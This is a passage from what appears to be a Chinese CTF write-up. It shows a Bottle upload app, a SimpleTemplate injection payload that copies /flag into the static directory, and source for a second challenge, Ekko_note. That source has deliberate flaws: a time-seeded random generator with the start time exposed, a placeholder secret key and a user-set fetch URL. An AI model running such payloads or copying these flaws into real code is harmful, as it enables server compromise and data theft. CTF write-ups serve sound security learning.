</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;文件列表: {{files}}</span><span class="se">\n</span><span class="s2">访问: /view/{{md5}}/{{first_file}}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">                    <span class="n">files</span><span class="o">=</span><span class="s2">&#34;, &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">files</span><span class="p">),</span> <span class="n">md5</span><span class="o">=</span><span class="n">md5_hash</span><span class="p">,</span> <span class="n">first_file</span><span class="o">=</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">files</span> <span class="k">else</span> <span class="s2">&#34;nofile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;File not found.&#34;</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">if</span> <span class="n">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;you are hacker!!!nonono!!!&#34;</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error rendering template: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span></code></pre></div><p>上传一个zip，他会解压并显示文件列表，并且可以查看文件内容</p>
<p>打 SimpleTemplate 模板渲染，直接把flag复制到静态目录</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">%</span> <span class="kn">import</span> <span class="nn">shutil</span><span class="p">;</span><span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="s1">&#39;static/flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">%</span> <span class="n">end</span>
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1755430984556-24.png"></p>
<p>访问带有payload的文件，代码执行拿到flag</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984425-1.png"></p>
<h2 id="ekko_note">Ekko_note<a hidden class="anchor" aria-hidden="true" href="#ekko_note">#</a></h2>
<p>源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="s1">@File    :   app.py
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="s1">@Time    :   2066/07/05 19:20:29
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="s1">@Author  :   Ekko exec inc. 某牛马程序员 
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">
</span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
</span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">token_urlsafe</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="kn">from</span> <span class="nn">flask_sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">
</span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="n">SERVER_START_TIME</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">
</span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="c1"># 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="c1"># 反正整个程序没有一个地方用到random库。应该没有什么问题。</span>
</span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">SERVER_START_TIME</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">
</span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="n">admin_super_strong_password</span> <span class="o">=</span> <span class="n">token_urlsafe</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;your-secret-key-here&#39;</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///site.db&#39;</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">
</span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">120</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Boolean</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">    <span class="n">time_api</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;https://api.uuni.cn//api/time&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl">
</span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="k">class</span> <span class="nc">PasswordResetToken</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">db</span><span class="o">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="s1">&#39;user.id&#39;</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">    <span class="n">used</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Boolean</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">
</span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">    <span class="n">byte_string</span> <span class="o">=</span> <span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span> <span class="n">byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">    <span class="n">padded_byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">    <span class="n">padded_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padded_byte_string</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">    <span class="k">return</span> <span class="n">padded_int</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">
</span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">    <span class="n">db</span><span class="o">.</span><span class="n">create_all</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">        <span class="n">admin</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">            <span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">            <span class="n">email</span><span class="o">=</span><span class="s1">&#39;admin@example.com&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">            <span class="n">password</span><span class="o">=</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="n">admin_super_strong_password</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">            <span class="n">is_admin</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">admin</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">
</span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="k">def</span> <span class="nf">login_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">    <span class="k">def</span> <span class="nf">decorated_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">        <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;请登录&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">    <span class="k">return</span> <span class="n">decorated_function</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">
</span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="k">def</span> <span class="nf">admin_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">    <span class="k">def</span> <span class="nf">decorated_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">        <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;请登录&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="o">.</span><span class="n">is_admin</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;你不是admin&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">    <span class="k">return</span> <span class="n">decorated_function</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">
</span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="k">def</span> <span class="nf">check_time_api</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">        <span class="n">datetime_str</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;date&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">        <span class="k">if</span> <span class="n">datetime_str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">            <span class="n">current_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromisoformat</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">            <span class="k">return</span> <span class="n">current_time</span><span class="o">.</span><span class="n">year</span> <span class="o">&gt;=</span> <span class="mi">2066</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;home.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">
</span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/server_info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="k">def</span> <span class="nf">server_info</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">        <span class="s1">&#39;server_start_time&#39;</span><span class="p">:</span> <span class="n">SERVER_START_TIME</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">        <span class="s1">&#39;current_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">116</span><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">        <span class="n">confirm_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;confirm_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl">
</span></span><span class="line"><span class="ln">121</span><span class="cl">        <span class="k">if</span> <span class="n">password</span> <span class="o">!=</span> <span class="n">confirm_password</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;密码错误&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl">
</span></span><span class="line"><span class="ln">125</span><span class="cl">        <span class="n">existing_user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">        <span class="k">if</span> <span class="n">existing_user</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;已经存在这个用户了&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">
</span></span><span class="line"><span class="ln">130</span><span class="cl">        <span class="n">existing_email</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">        <span class="k">if</span> <span class="n">existing_email</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;这个邮箱已经被注册了&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">
